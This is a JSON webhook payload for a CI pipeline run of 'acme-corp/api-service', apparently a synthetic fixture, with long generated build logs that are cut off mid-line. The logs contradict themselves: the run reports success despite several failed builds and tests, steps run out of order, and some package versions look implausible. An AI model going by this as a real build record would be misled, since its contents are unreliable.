{
  "action": "completed",
  "workflow_run": {
    "id": 253,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "8e3fbb456c08dad132fb89d93c9179e4350dba63",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-04T12:00:22.633421Z",
    "updated_at": "2025-12-04T12:02:43.594867Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nCompiling src/app.ts...\nCache hit for key-8443\n[12:00:22] INFO: Processing request\nCache hit for key-9621\nCache hit for key-2637\nCompiling src/main.py...\n[12:00:22] INFO: Processing request\n  PASS: test_db_connect (414ms)\nCache hit for key-8351\nCompiling src/utils.go...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-8689\nArtifact uploaded: build.tar.gz (37MB)\nStep 8/10: Building\nCache hit for key-3995\nCache hit for key-8223\nCompiling src/index.js...\nCache hit for key-9679\n  PASS: test_auth_login (94ms)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:22] INFO: Processing request\n\u2713 test completed\n[12:00:22] INFO: Processing request\nCache hit for key-7109\nException: NullPointerException\n  PASS: test_api_health (246ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (34MB)\nStep 8/10: Building\n\u2713 build completed\n[12:00:22] INFO: Processing request\n\u2713 test completed\n[12:00:22] INFO: Processing request\nStep 7/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (26MB)\nInstalling lodash@1.7.0\nStep 2/10: Building\nCache hit for key-3112\n[12:00:22] ERROR: Connection failed\n  PASS: test_user_create (443ms)\n  PASS: test_user_create (493ms)\nArtifact uploaded: build.tar.gz (1MB)\nStep 4/10: Building\nCache hit for key-6288\nInstalling prettier@4.6.0\nInstalling webpack@2.9.0\nCache hit for key-4378\nCache hit for key-3150\n  PASS: test_user_create (28ms)\n[12:00:22] INFO: Processing request\nCache hit for key-8180\nCompiling src/handler.rs...\nInstalling prettier@1.5.0\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nInstalling axios@2.14.0\nCache hit for key-7750\nInstalling webpack@5.13.0\nCache hit for key-6662\nStep 8/10: Building\n  PASS: test_user_create (445ms)\n  PASS: test_api_health (480ms)\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nStep 4/10: Building\n  PASS: test_cache_hit (330ms)\n[12:00:22] WARN: Deprecated API usage\nInstalling jest@5.10.0\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_api_health (79ms)\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:22] WARN: Deprecated API usage\n  PASS: test_api_health (460ms)\nCache hit for key-5116\n[12:00:22] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_user_create (240ms)\nArtifact uploaded: build.tar.gz (22MB)\nInstalling webpack@1.11.0\n[12:00:22] INFO: Processing request\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (42MB)\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (41MB)\n[12:00:22] INFO: Processing request\nStep 8/10: Building\nCompiling src/index.js...\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-5334\nWARNING: react has known vulnerabilities\nCache hit for key-7159\nArtifact uploaded: build.tar.gz (31MB)\nStep 9/10: Building\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-4009\nInstalling react@4.1.0\nWARNING: webpack has known vulnerabilities\n=== Step deploy_staging completed ===\n=== Step: save_cache ===\nCompiling src/utils.go...\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (26MB)\n\u2717 build failed with exit code 59\nStep 7/10: Building\nInstalling axios@5.20.0\n[12:00:22] INFO: Processing request\nStep 9/10: Building\n  PASS: test_auth_login (159ms)\nStep 6/10: Building\nStep 7/10: Building\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nInstalling express@2.10.0\nStep 3/10: Building\n[12:00:22] INFO: Processing request\nStep 8/10: Building\nCache hit for key-8728\n  PASS: test_auth_login (348ms)\nCompiling src/handler.rs...\nCache hit for key-6409\nArtifact uploaded: build.tar.gz (16MB)\nStep 3/10: Building\nCache hit for key-2512\n  PASS: test_user_create (158ms)\n  PASS: test_auth_login (98ms)\nCache hit for key-3838\n\u2713 lint completed\n  PASS: test_user_create (330ms)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (3MB)\n  PASS: test_auth_login (325ms)\nCompiling src/main.py...\nWARNING: prettier has known vulnerabilities\nCache hit for key-5626\n[12:00:22] ERROR: Connection failed\n  PASS: test_auth_login (15ms)\nStep 4/10: Building\n[12:00:22] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-8430\nCompiling src/app.ts...\nInstalling prettier@2.11.0\nStep 2/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-9285\nInstalling react@1.19.0\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-5192\n\u2713 test completed\n  PASS: test_cache_hit (391ms)\n  PASS: test_api_health (488ms)\nInstalling eslint@2.15.0\nCache hit for key-5302\nInstalling react@5.6.0\nCache hit for key-6626\nInstalling express@1.16.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (18MB)\nCache hit for key-6036\n\u2713 lint completed\n[12:00:22] INFO: Processing request\nStep 10/10: Building\n\u2713 test completed\nInstalling express@3.9.0\nInstalling axios@3.10.0\nCompiling src/app.ts...\nStep 1/10: Building\nInstalling axios@2.0.0\nCompiling src/handler.rs...\nStep 6/10: Building\n  PASS: test_auth_login (188ms)\n  PASS: test_cache_hit (146ms)\n[12:00:22] INFO: Processing request\nStep 4/10: Building\n[12:00:22] WARN: Deprecated API usage\n  PASS: test_auth_login (404ms)\nInstalling react@3.4.0\nInstalling express@1.8.0\nStep 9/10: Building\nInstalling webpack@1.0.0\nCache hit for key-4072\nInstalling eslint@1.10.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-3700\nCompiling src/index.js...\n  PASS: test_auth_login (496ms)\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/service.java...\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/main.py...\nStep 3/10: Building\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nInstalling axios@4.19.0\n  PASS: test_user_create (254ms)\nStep 5/10: Building\nStep 5/10: Building\nCompiling src/handler.rs...\nStep 5/10: Building\nStep 8/10: Building\nInstalling express@4.17.0\n=== Step save_cache completed ===\n=== Step: unit_tests ===\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/app.ts...\nStep 2/10: Building\nCache hit for key-5299\n[12:00:22] INFO: Processing request\n  PASS: test_api_health (335ms)\nCache hit for key-8518\n\u2713 build completed\n[12:00:22] ERROR: Connection failed\n  PASS: test_auth_login (20ms)\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_user_create (496ms)\n\u2713 build completed\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (21MB)\nStep 3/10: Building\nCache hit for key-6998\n[12:00:22] INFO: Processing request\n\u2713 build completed\nFAILED: test_db_connect\nStep 6/10: Building\nCompiling src/utils.go...\n[12:00:22] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nCompiling src/main.py...\n  PASS: test_user_create (229ms)\n[12:00:22] WARN: Deprecated API usage\n\u2713 build completed\nCache hit for key-6309\nInstalling react@3.11.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nStep 9/10: Building\n[12:00:22] INFO: Processing request\n  PASS: test_auth_login (355ms)\n\u2713 build completed\n[12:00:22] INFO: Processing request\nCache hit for key-4516\n[12:00:22] INFO: Processing request\nCache hit for key-9463\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: axios has known vulnerabilities\nCompiling src/handler.rs...\n\u2713 lint completed\nCompiling src/index.js...\n[12:00:22] INFO: Processing request\nInstalling react@4.3.0\n\u2713 test completed\nCache hit for key-7163\nCache hit for key-2935\n[12:00:22] INFO: Processing request\n[12:00:22] ERROR: Connection failed\nCache hit for key-3249\n\u2717 build failed with exit code 110\nArtifact uploaded: build.tar.gz (16MB)\n\u2713 test completed\n  PASS: test_db_connect (359ms)\nWARNING: react has known vulnerabilities\nCache hit for key-8819\nInstalling axios@2.13.0\nFAILED: test_auth_login\nInstalling express@5.13.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 6/10: Building\nWARNING: prettier has known vulnerabilities\nInstalling axios@5.10.0\nStep 9/10: Building\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nCache hit for key-1299\nCompiling src/utils.go...\n[12:00:22] INFO: Processing request\n[12:00:22] ERROR: Connection failed\nCache hit for key-8177\nStep 3/10: Building\n[12:00:22] INFO: Processing request\n  PASS: test_user_create (123ms)\nCompiling src/app.ts...\nWARNING: express has known vulnerabilities\nCompiling src/service.java...\nCache hit for key-3499\n[12:00:22] INFO: Processing request\n\u2713 build completed\nInstalling lodash@2.2.0\nInstalling prettier@2.20.0\nCompiling src/index.js...\nStep 7/10: Building\nStep 9/10: Building\n  PASS: test_user_create (251ms)\n\u2713 test completed\n[12:00:22] INFO: Processing request\nInstalling jest@4.1.0\nCompiling src/service.java...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (29MB)\nStep 3/10: Building\nInstalling prettier@2.8.0\nCompiling src/handler.rs...\n[12:00:22] ERROR: Connection failed\n  PASS: test_api_health (2ms)\nCache hit for key-1661\nCache hit for key-4226\n\u2713 lint completed\nInstalling express@4.17.0\n[12:00:22] INFO: Processing request\nCompiling src/main.py...\n=== Step unit_tests completed ===\n=== Step: deploy_production ===\n\u2713 lint completed\nStep 9/10: Building\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n  PASS: test_db_connect (149ms)\n\u2713 build completed\nCompiling src/utils.go...\nCache hit for key-8537\nArtifact uploaded: build.tar.gz (21MB)\nInstalling prettier@4.19.0\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/handler.rs...\n  PASS: test_cache_hit (253ms)\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_auth_login (265ms)\nCompiling src/utils.go...\n\u2713 build completed\nCompiling src/handler.rs...\n\u2713 lint completed\n\u2717 build failed with exit code 26\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (47MB)\nInstalling prettier@3.10.0\nWARNING: react has known vulnerabilities\nInstalling axios@3.4.0\nCache hit for key-1485\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:22] INFO: Processing request\n[12:00:22] WARN: Deprecated API usage\nStep 7/10: Building\nCompiling src/service.java...\nInstalling express@4.7.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/service.java...\n\u2713 test completed\n[12:00:22] INFO: Processing request\nInstalling webpack@4.16.0\nCompiling src/service.java...\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 lint completed\n[12:00:22] INFO: Processing request\nCache hit for key-5625\nInstalling express@4.20.0\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 test completed\nCompiling src/handler.rs...\nInstalling react@3.14.0\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:22] INFO: Processing request\n[12:00:22] ERROR: Connection failed\nInstalling react@4.0.0\nArtifact uploaded: build.tar.gz (23MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (382ms)\n\u2713 test completed\n[12:00:22] INFO: Processing request\nCache hit for key-5641\nCache hit for key-2787\n\u2713 build completed\n\u2713 lint completed\nStep 5/10: Building\nException: ValueError\nCompiling src/index.js...\nInstalling prettier@5.6.0\nInstalling lodash@3.5.0\n  PASS: test_db_connect (332ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:22] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling jest@4.8.0\nCache hit for key-1926\nInstalling prettier@2.1.0\nInstalling webpack@3.13.0\nCompiling src/service.java...\nInstalling eslint@5.5.0\nStep 4/10: Building\nInstalling react@1.16.0\nCompiling src/main.py...\nCache hit for key-1978\nCache hit for key-2753\nCompiling src/index.js...\n  PASS: test_api_health (26ms)\nStep 4/10: Building\n[12:00:22] INFO: Processing request\n\u2713 test completed\n[12:00:22] INFO: Processing request\nStep 3/10: Building\nInstalling prettier@2.17.0\nArtifact uploaded: build.tar.gz (20MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:22] WARN: Deprecated API usage\n\u2713 lint completed\n\u2713 lint completed\nCompiling src/utils.go...\n[12:00:22] INFO: Processing request\nStep 4/10: Building\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:22] INFO: Processing request\nInstalling webpack@4.20.0\nCache hit for key-4777\n[12:00:22] INFO: Processing request\nCache hit for key-2960\n=== Step deploy_production completed ===\n=== Step: checkout ===\nArtifact uploaded: build.tar.gz (29MB)\n\u2717 build failed with exit code 38\nArtifact uploaded: build.tar.gz (38MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\n[12:00:22] INFO: Processing request\nWARNING: express has known vulnerabilities\nException: TypeError\n  PASS: test_api_health (420ms)\n[12:00:22] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 5/10: Building\n\u2713 test completed\nCompiling src/app.ts...\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n\u2713 test completed\n\u2713 build completed\nCache hit for key-7700\n[12:00:22] INFO: Processing request\nStep 10/10: Building\n  PASS: test_auth_login (246ms)\nCompiling src/handler.rs...\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] INFO: Processing request\nCache hit for key-4516\n\u2713 build completed\nInstalling lodash@2.15.0\n  PASS: test_db_connect (90ms)\n[12:00:22] INFO: Processing request\nCompiling src/main.py...\n[12:00:22] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (21MB)\nInstalling jest@5.20.0\n[12:00:22] INFO: Processing request\n  PASS: test_user_create (365ms)\nStep 5/10: Building\n  PASS: test_db_connect (144ms)\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:22] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (20MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nException: ValueError\nCache hit for key-5312\nInstalling eslint@4.2.0\nCache hit for key-1101\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:22] INFO: Processing request\nCache hit for key-4491\nCompiling src/service.java...\nCompiling src/main.py...\nStep 5/10: Building\nCache hit for key-2749\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (48MB)\nInstalling axios@2.0.0\nInstalling express@5.11.0\n  PASS: test_db_connect (445ms)\nCache hit for key-8979\nStep 3/10: Building\n  PASS: test_api_health (500ms)\n[12:00:22] INFO: Processing request\nInstalling webpack@2.18.0\nStep 5/10: Building\nCache hit for key-7155\n[12:00:22] INFO: Processing request\n  PASS: test_cache_hit (134ms)\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (46MB)\nStep 1/10: Building\nCache hit for key-3483\nInstalling lodash@1.13.0\nStep 4/10: Building\n  PASS: test_cache_hit (83ms)\n\u2713 test completed\n\u2713 test completed\nCache hit for key-2570\nInstalling lodash@2.17.0\nCache hit for key-6853\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:22] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_api_health (205ms)\nArtifact uploaded: build.tar.gz (46MB)\nStep 5/10: Building\nStep 7/10: Building\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-3313\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/main.py...\nCompiling src/service.java...\nCache hit for key-9328\n[12:00:22] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-5254\n=== Step checkout completed ===\n=== Step: integration_tests ===\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-3537\nCompiling src/handler.rs...\n[12:00:22] INFO: Processing request\n\u2713 build completed\nInstalling lodash@5.10.0\n\u2713 test completed\nStep 8/10: Building\nStep 10/10: Building\nStep 4/10: Building\nStep 1/10: Building\n  PASS: test_cache_hit (254ms)\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:22] INFO: Processing request\nCompiling src/main.py...\nInstalling jest@2.0.0\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nInstalling prettier@1.7.0\nCompiling src/app.ts...\n\u2713 test completed\nInstalling react@1.3.0\nStep 1/10: Building\n  PASS: test_auth_login (441ms)\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (10MB)\nStep 2/10: Building\n  PASS: test_user_create (69ms)\nArtifact uploaded: build.tar.gz (32MB)\nInstalling axios@5.15.0\nCache hit for key-7131\nCache hit for key-9224\n\u2713 test completed\nArtifact uploaded: build.tar.gz (15MB)\nWARNING: axios has known vulnerabilities\n  PASS: test_db_connect (459ms)\n[12:00:22] INFO: Processing request\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:22] INFO: Processing request\nStep 1/10: Building\nInstalling axios@5.3.0\n\u2713 test completed\nWARNING: prettier has known vulnerabilities\nCache hit for key-8003\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (47MB)\nInstalling react@1.0.0\nCache hit for key-4159\nCache hit for key-7340\n  PASS: test_cache_hit (114ms)\nWARNING: webpack has known vulnerabilities\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_db_connect (329ms)\n[12:00:22] INFO: Processing request\nException: ValueError\n[12:00:22] INFO: Processing request\n\u2713 test completed\nStep 6/10: Building\nCache hit for key-9596\nInstalling eslint@3.4.0\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 7/10: Building\n[12:00:22] INFO: Processing request\nInstalling express@5.13.0\nCache hit for key-9826\nCache hit for key-7942\nStep 9/10: Building\n[12:00:22] INFO: Processing request\nWARNING: axios has known vulnerabilities\n[12:00:22] WARN: Deprecated API usage\nInstalling jest@2.1.0\nInstalling jest@2.11.0\n\u2713 test completed\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nCache hit for key-5768\nInstalling axios@1.6.0\n[12:00:22] INFO: Processing request\nCache hit for key-2267\nInstalling prettier@2.1.0\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:22] ERROR: Connection failed\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_db_connect (299ms)\nStep 1/10: Building\n\u2713 build completed\n\u2717 build failed with exit code 117\n\u2713 test completed\n\u2713 lint completed\nStep 9/10: Building\nInstalling webpack@3.4.0\nCompiling src/index.js...\nStep 7/10: Building\nCache hit for key-7136\n  PASS: test_api_health (433ms)\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (49MB)\nWARNING: webpack has known vulnerabilities\n=== Step integration_tests completed ===\n=== Step: restore_cache ===\nCache hit for key-8476\nArtifact uploaded: build.tar.gz (8MB)\nInstalling webpack@5.1.0\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (40MB)\n\u2717 build failed with exit code 122\nInstalling react@2.10.0\n  PASS: test_api_health (308ms)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_user_create (101ms)\nWARNING: prettier has known vulnerabilities\nCache hit for key-1341\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_db_connect (208ms)\n\u2713 test completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:22] INFO: Processing request\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] INFO: Processing request\nInstalling react@3.20.0\nWARNING: webpack has known vulnerabilities\n\u2713 lint completed\nCache hit for key-6575\n  PASS: test_user_create (411ms)\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] WARN: Deprecated API usage\n  PASS: test_api_health (469ms)\nCache hit for key-3016\nInstalling axios@4.13.0\nStep 10/10: Building\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (4MB)\nInstalling express@3.3.0\nCache hit for key-6705\n[12:00:22] INFO: Processing request\n[12:00:22] ERROR: Connection failed\n\u2713 lint completed\n  PASS: test_db_connect (386ms)\nCompiling src/index.js...\nInstalling express@2.17.0\n\u2713 build completed\nStep 4/10: Building\nInstalling axios@5.4.0\n\u2713 test completed\n  PASS: test_api_health (376ms)\n\u2713 test completed\n  PASS: test_db_connect (366ms)\nCompiling src/utils.go...\n  PASS: test_auth_login (143ms)\nCache hit for key-3318\n  PASS: test_cache_hit (275ms)\nCompiling src/app.ts...\nCompiling src/index.js...\n\u2713 lint completed\nStep 3/10: Building\nCache hit for key-3509\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/service.java...\n[12:00:22] WARN: Deprecated API usage\nStep 7/10: Building\nWARNING: prettier has known vulnerabilities\nCompiling src/handler.rs...\nInstalling eslint@4.13.0\nInstalling webpack@4.17.0\n[12:00:22] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-6119\n[12:00:22] INFO: Processing request\nStep 8/10: Building\nCompiling src/main.py...\n\u2713 build completed\n  PASS: test_auth_login (58ms)\n[12:00:22] ERROR: Connection failed\n[12:00:22] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nStep 10/10: Building\n[12:00:22] INFO: Processing request\nCompiling src/utils.go...\nInstalling eslint@2.6.0\n\u2717 build failed with exit code 82\nCache hit for key-3453\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (33MB)\nInstalling webpack@5.4.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (13MB)\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/service.java...\n\u2713 test completed\n[12:00:22] INFO: Processing request\nCompiling src/main.py...\nInstalling lodash@2.1.0\n[12:00:22] WARN: Deprecated API usage\nInstalling axios@5.14.0\nCompiling src/app.ts...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_user_create (232ms)\nCompiling src/utils.go...\n\u2713 build completed\nStep 8/10: Building\nWARNING: jest has known vulnerabilities\nInstalling axios@3.13.0\n=== Step restore_cache completed ===\n=== Step: lint ===\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 lint completed\nStep 2/10: Building\n\u2713 build completed\nCache hit for key-6064\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (7MB)\nInstalling webpack@4.13.0\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:22] ERROR: Connection failed\nCache hit for key-7112\nCache hit for key-2843\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/app.ts...\n[12:00:22] INFO: Processing request\nInstalling webpack@4.17.0\n[12:00:22] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:22] INFO: Processing request\nCache hit for key-2025\n\u2713 test completed\n[12:00:22] INFO: Processing request\nInstalling lodash@3.11.0\nCache hit for key-3672\n[12:00:22] INFO: Processing request\nCache hit for key-1919\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/app.ts...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/app.ts...\n[12:00:22] INFO: Processing request\n\u2717 build failed with exit code 73\nStep 1/10: Building\nStep 2/10: Building\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nStep 10/10: Building\n  PASS: test_api_health (73ms)\nInstalling eslint@5.13.0\nCache hit for key-7218\nCache hit for key-7769\nInstalling eslint@2.5.0\nStep 2/10: Building\nInstalling jest@1.2.0\n  PASS: test_user_create (140ms)\nArtifact uploaded: build.tar.gz (7MB)\nStep 7/10: Building\nCache hit for key-5095\nCache hit for key-2711\nCompiling src/app.ts...\n[12:00:22] INFO: Processing request\n  PASS: test_cache_hit (343ms)\nArtifact uploaded: build.tar.gz (42MB)\nInstalling react@5.16.0\nException: ValueError\n\u2713 lint completed\n  PASS: test_db_connect (309ms)\nArtifact uploaded: build.tar.gz (22MB)\n\u2713 build completed\n[12:00:22] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_auth_login (493ms)\nCache hit for key-8232\nStep 5/10: Building\nCache hit for key-9063\nWARNING: prettier has known vulnerabilities\nCache hit for key-8855\n\u2713 build completed\nInstalling express@1.13.0\nCache hit for key-9153\nArtifact uploaded: build.tar.gz (22MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-1105\n  PASS: test_cache_hit (56ms)\nWARNING: webpack has known vulnerabilities\nInstalling prettier@3.11.0\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nStep 8/10: Building\nCache hit for key-8322\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (35MB)\n  PASS: test_cache_hit (286ms)\n\u2713 build completed\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 test completed\nStep 4/10: Building\n\u2713 test completed\nInstalling webpack@1.17.0\nCache hit for key-3324\nCompiling src/handler.rs...\nInstalling jest@1.9.0\nStep 6/10: Building\n\u2713 test completed\n=== Step lint completed ===\n=== Step: type_check ===\nInstalling prettier@2.9.0\nException: ValueError\nCache hit for key-7676\nCompiling src/app.ts...\nCache hit for key-6206\n  PASS: test_auth_login (497ms)\n  PASS: test_auth_login (127ms)\nArtifact uploaded: build.tar.gz (16MB)\nInstalling react@5.12.0\n\u2713 build completed\n  PASS: test_db_connect (364ms)\n[12:00:22] WARN: Deprecated API usage\n  PASS: test_db_connect (413ms)\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-3116\nCache hit for key-7842\nCompiling src/utils.go...\n  PASS: test_db_connect (468ms)\nCache hit for key-2961\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:22] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:22] INFO: Processing request\n\u2713 build completed\nWARNING: prettier has known vulnerabilities\n  PASS: test_cache_hit (467ms)\nStep 2/10: Building\nCache hit for key-6376\n[12:00:22] WARN: Deprecated API usage\nInstalling axios@5.12.0\nCache hit for key-5206\n\u2713 build completed\n\u2713 test completed\n[12:00:22] INFO: Processing request\nCompiling src/service.java...\n\u2713 build completed\n[12:00:22] WARN: Deprecated API usage\nInstalling express@3.1.0\nStep 10/10: Building\nInstalling express@1.2.0\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 lint completed\n[12:00:22] INFO: Processing request\n\u2713 build completed\nCache hit for key-7436\nCache hit for key-4901\nCompiling src/app.ts...\n\u2717 build failed with exit code 85\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 lint completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:22] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (14MB)\n\u26a0 DEPRECATION: Feature will be removed in 